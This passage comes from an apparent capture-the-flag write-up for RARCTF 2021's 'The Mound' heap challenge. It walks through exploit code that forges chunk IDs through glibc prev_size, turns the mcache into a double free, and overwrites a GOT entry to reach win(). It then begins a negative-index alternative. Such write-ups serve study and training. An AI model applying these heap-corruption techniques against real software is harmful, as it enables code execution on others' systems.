</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>find_id</span><span class=p>(</span><span class=n>size_t</span> <span class=n>id</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>4095</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>id</span> <span class=o>==</span> <span class=n>mound_arena</span><span class=p>.</span><span class=n>ids</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Mound: Double free detected&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>A typical <code>malloc_chunk</code> looks like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>malloc_chunk</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span>      <span class=n>mchunk_prev_size</span><span class=p>;</span>  <span class=cm>/* Size of previous chunk (if free).  */</span>
</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span>      <span class=n>mchunk_size</span><span class=p>;</span>       <span class=cm>/* Size in bytes, including overhead. */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span>         <span class=cm>/* double links -- used only if free. */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>bk</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>Because <code>c->id</code> occupies the same space as a <code>malloc_chunk</code>&rsquo;s <code>mchunk_prev_size</code> member, the <code>prev_size</code> of the glibc heap chunk is taken as the <code>id</code> in <code>find_id</code>. The glibc chunk pointers allocated by <code>strdup()</code> will <em>never</em> be free, so <code>prev_size == id</code> should always be 0, and <code>find_id(c->id)</code> should always result in an error given a glibc heap chunk.</p><p>Or not.</p><h2 id=the-obvious-solution>The Obvious Solution</h2><p>It takes me a while, but I eventually realise that the preceding paragraph is false. Sequential malloc chunks can use the <code>prev_size</code> field to store user data:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/prev_size.png data-srcset="/blog/rarctf-2021-the-mound/prev_size.png, /blog/rarctf-2021-the-mound/prev_size.png 1.5x, /blog/rarctf-2021-the-mound/prev_size.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/prev_size.png title=/blog/rarctf-2021-the-mound/prev_size.png width=602 height=192></p><p>This means that if I call <code>strdup("A"*0x17)</code> twice in succession, the first <code>strdup()</code> chunk allocated can be used to overwrite the <code>prev_size</code> of the 2nd <code>strdup()</code> chunk:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>),</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/prev_size2.png data-srcset="/blog/rarctf-2021-the-mound/prev_size2.png, /blog/rarctf-2021-the-mound/prev_size2.png 1.5x, /blog/rarctf-2021-the-mound/prev_size2.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/prev_size2.png title=/blog/rarctf-2021-the-mound/prev_size2.png width=602 height=222></p><p>Using this method, the interpreted <code>mchunk->id</code> for a glibc heap chunk can be modified to any value within <code>range(0, 1&lt;&lt;56)</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># register an arbitrary 56-bit id onto the mound&#39;s free id list</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reg_id</span><span class=p>(</span><span class=nb>id</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=nb>id</span><span class=p>)[:</span><span class=mi>7</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>What are the consequences of this? Adding a new <code>id</code> to <code>mound_arena.ids[]</code> is pretty useless; it would only make allocations <em>harder</em> instead of easier. I could also try to get rid of an ID:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>r64</span><span class=p>():</span> <span class=k>return</span> <span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=mi>64</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1># generate random ids. Unrelated to rand64bit()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm_id</span><span class=p>(</span><span class=nb>id</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span> <span class=c1># remove an arbitrary 56-bit id from mound_arena.ids[]</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>r64</span><span class=p>())[:</span><span class=mi>7</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=nb>id</span><span class=p>)[:</span><span class=mi>7</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Then I&rsquo;d be able to free the same region of memory twice, like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># r = ...</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>^</span><span class=n>r</span><span class=o>.</span><span class=n>pid</span><span class=p>)</span> <span class=c1># pid will have to be guessed on remote</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rand64bit</span><span class=p>():</span> <span class=k>return</span> <span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span> <span class=o>+</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ... omitted code ...</span>
</span></span><span class=line><span class=cl><span class=c1># ... make sure to account for rand() calls throughout code as well ...</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>sz</span><span class=o>=</span><span class=mh>0x20</span><span class=p>,</span> <span class=n>idx</span><span class=o>=</span><span class=mh>0xf</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=ow>not</span> <span class=p>((</span><span class=n>chunk_id</span> <span class=o>:=</span> <span class=n>rand64bit</span><span class=p>())</span> <span class=o>&gt;&gt;</span> <span class=mi>56</span><span class=p>):</span> <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mh>0xf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rm_id</span><span class=p>(</span><span class=n>chunk_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mh>0xf</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>This is a classic tcache dup, except with the <code>mcache</code> instead. Once you accomplish this much, getting to <code>win()</code> isn&rsquo;t much of a challenge.</p><h3 id=getting-to-win>Getting to <code>win()</code></h3><p>Right now, <code>mcache->entries[1] == [arr[0xf] -> arr[0xf]]</code>. <code>arr[0xf]->next</code> can be modified to anything, so long as <code>(mcache_entry*)(arr[0xf]->next)->mcache == mound_arena.mcache</code>. Taking a hint from the the definition, I&rsquo;ll try to point <code>->next</code> to <code>mound_arena.mcache-0x10</code>, because it&rsquo;s the only non-user-controlled region that happens to have an <code>mcache</code> pointer.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0xe</span><span class=p>,</span> <span class=n>fit</span><span class=p>(</span><span class=mh>0xbeef0000010</span><span class=p>,</span> <span class=mh>0xdead0007ff8</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>The linked list here is now <code>[arr[0xf] -> mound_arena+0x7ff8]</code>. As a reminder, the <code>mound_arena</code> looks like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>mound_metadata</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>mound_base</span><span class=p>;</span> <span class=c1>// = 0xbeef0000000; never used for anything
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>size_t</span> <span class=n>ids</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span> <span class=c1>// rand64() ids assigned to every chunk allocated by mmalloc.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mcache_struct</span> <span class=o>*</span><span class=n>mcache</span><span class=p>;</span> <span class=c1>// tcache, but for the mound.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mchunk</span> <span class=o>*</span><span class=n>top</span><span class=p>;</span> <span class=c1>// pointer to the top chunk
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=n>mound_metadata</span><span class=p>;</span> <span class=c1>// sizeof(mound_metadata) == 0x8018
</span></span></span></code></pre></td></tr></table></div></div><p>Right after the <code>mcache</code> is the <code>top</code> pointer. Pulling two items off of the mcache linked list will get the <code>top</code> pointer overwritten with user-controllable data:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0xd</span><span class=p>,</span> <span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0xc</span><span class=p>,</span> <span class=n>fit</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>mcache</span><span class=p>,</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;setvbuf&#39;</span><span class=p>]))</span>
</span></span></code></pre></td></tr></table></div></div><p>Here, I&rsquo;m overwriting <code>mound_data.top</code> with a GOT pointer to gain RIP control:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=mh>0xb</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span> <span class=c1># this will overwrite got.scanf()</span>
</span></span></code></pre></td></tr></table></div></div><p>And now the exploit reaches <code>win()</code>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/image-20210808125053271.png data-srcset="/blog/rarctf-2021-the-mound/image-20210808125053271.png, /blog/rarctf-2021-the-mound/image-20210808125053271.png 1.5x, /blog/rarctf-2021-the-mound/image-20210808125053271.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/image-20210808125053271.png title=/blog/rarctf-2021-the-mound/image-20210808125053271.png width=350 height=174></p><p>Simple enough, right?</p><h2 id=on-the-lengths-i-will-go-to-fool-myself-a-novel-inferior-exploit-approach>On the lengths I will go to fool myself: a novel, inferior exploit approach</h2><p>Picture this: it&rsquo;s the middle of a Saturday afternoon. I&rsquo;m looking at gdb in one window, and vim in the next. There&rsquo;s a little voice at the back of my head pleading me to attend to lunch and other bodily needs, but my eyes are entranced by the dark abyss of the Hex-Rays™ decompiler.</p><p>In short, I&rsquo;m not really thinking straight. But what I <em>do</em> notice, in my digital stupor, are the comments I have open in <em>Pseudocode-Q</em><sup>3</sup>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/image-20210808184955019.png data-srcset="/blog/rarctf-2021-the-mound/image-20210808184955019.png, /blog/rarctf-2021-the-mound/image-20210808184955019.png 1.5x, /blog/rarctf-2021-the-mound/image-20210808184955019.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/image-20210808184955019.png title=/blog/rarctf-2021-the-mound/image-20210808184955019.png width=1228 height=356></p><p>I had dismissed the immediate relevance of <code>strdup()</code> with the false reasoning I&rsquo;d demonstrated at the end of <a href=#mixing-heap-allocators rel>this section</a>. I even got to work on rationalizing the apparent irrelevancy of <code>case 1/3</code>; my writeup had these lines at one point:</p><blockquote><p>It&rsquo;s reasonable to assume that <code>strdup()</code> was introduced explicitly as an exploit vector for the challenge, so I can expect that there&rsquo;s a way to edit <code>mchunk_prev_size</code> without calling <code>free()</code>. On a wild guess, I expect that the final exploit involves modifying <code>sizes[idx]</code> and overflowing into glibc chunk metadata via <code>case 3</code>.</p></blockquote><blockquote><p>Since there&rsquo;s currently no way to move forward with <code>case 1/3</code>, I&rsquo;ll shift my focus to the other two cases.</p></blockquote><p>The bug I spotted here proved to be unnecessary. Altogether, you can solve the challenge without ever noticing the odd behaviour associated with <code>mmalloc(0)</code>. Nonetheless, the resulting exploit I cobbled together is interesting, unique enough that I&rsquo;d prefer to leave the details available to the public.</p><p>So, let&rsquo;s talk about <code>mmalloc()</code>.</p><h3 id=mmalloc-and-mfree><code>mmalloc()</code> and <code>mfree()</code></h3><p><code>mmalloc()</code> is only ever called in <code>case 2</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=c1>// add
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=n>user_sz</span> <span class=o>&lt;=</span> <span class=mh>0xFFF</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ... omitted ...
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mh>0xF</span> <span class=p>)</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>mmalloc</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>getinput</span><span class=p>(</span><span class=s>&#34;Pile: &#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;A bit too much dirt my friend.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>break</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>mmalloc()</code> itself is defined a little oddly:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=o>*</span><span class=nf>mmalloc</span><span class=p>(</span><span class=kt>int</span> <span class=n>user_sz</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>chunk_sz</span> <span class=o>=</span> <span class=n>request2size</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>chunk_sz</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>  <span class=c1>// not sure what the purpose of this is
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>chunk_sz</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>user_sz</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>+</span> <span class=n>user_sz</span> <span class=o>+</span> <span class=mi>31</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>midx</span> <span class=o>=</span> <span class=n>csize2midx</span><span class=p>(</span><span class=n>chunk_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>midx</span> <span class=o>&lt;=</span> <span class=mh>0x17</span> <span class=o>&amp;&amp;</span> <span class=n>mound_arena</span><span class=p>.</span><span class=n>mcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>midx</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>mcache_alloc</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>top_chunk_alloc</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>If I expand the macros, the bug becomes more obvious:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=o>*</span><span class=nf>mmalloc</span><span class=p>(</span><span class=kt>int</span> <span class=n>user_sz</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// 0 &lt;= user_sz &lt;= 0xfff
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>chunk_sz</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>user_sz</span><span class=o>&amp;</span><span class=mh>0xf</span><span class=p>)</span><span class=o>+</span><span class=n>user_sz</span><span class=o>+</span><span class=mh>0x10</span><span class=p>;</span> <span class=c1>// 0x10 &lt;= chunk_sz &lt;= 0x1010 
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=n>chunk_sz</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>  <span class=cm>/* { ... } ignore */</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>midx</span> <span class=o>=</span> <span class=p>(</span><span class=n>chunk_sz</span><span class=o>&gt;&gt;</span><span class=mi>4</span><span class=p>)</span><span class=o>-</span><span class=mi>2</span><span class=p>;</span> <span class=c1>// -1 &lt;= midx &lt;= 0xff
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=n>midx</span> <span class=o>&lt;=</span> <span class=mh>0x17</span> <span class=o>&amp;&amp;</span> <span class=n>mound_arena</span><span class=p>.</span><span class=n>mcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>midx</span><span class=p>]</span> <span class=p>)</span> <span class=c1>// possible negative index here!!!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=n>mcache_alloc</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>top_chunk_alloc</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>As a reminder, the <code>mcache</code> is structured like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>mcache_struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>counts</span><span class=p>[</span><span class=n>MCACHE_MAX_BINS</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>mcache_entry</span> <span class=o>*</span><span class=n>entries</span><span class=p>[</span><span class=n>MCACHE_MAX_BINS</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>mcache->entries[-1]</code> <em>really</em> refers to <code>mcache->counts[0x10:0x18]</code>. By filling up the <code>mcache</code> bins for <code>0x120 &lt;= chunk_sz &lt; 0x1a0</code>, we can get <code>mcache->entries[-1]</code> to point to <strong>any arbitrary location</strong>.</p><p>The subsequent call to <code>mmalloc_alloc(0)</code> has a small safety check, as I showed earlier in the flowchart:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=o>*</span><span class=nf>mcache_alloc</span><span class=p>(</span><span class=kt>int</span> <span class=n>user_sz</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// user_sz = 0
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>mcache_struct</span> <span class=o>*</span><span class=n>mcache_</span> <span class=o>=</span> <span class=n>mcache</span><span class=p>;</span>  <span class=c1>// [rsp+30h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>midx</span> <span class=o>=</span> <span class=n>csize2midx</span><span class=p>(</span><span class=n>request2size</span><span class=p>(</span><span class=n>user_sz</span><span class=p>))</span> <span class=c1>// midx = -1, [rsp+2Ch] [rbp-14h]
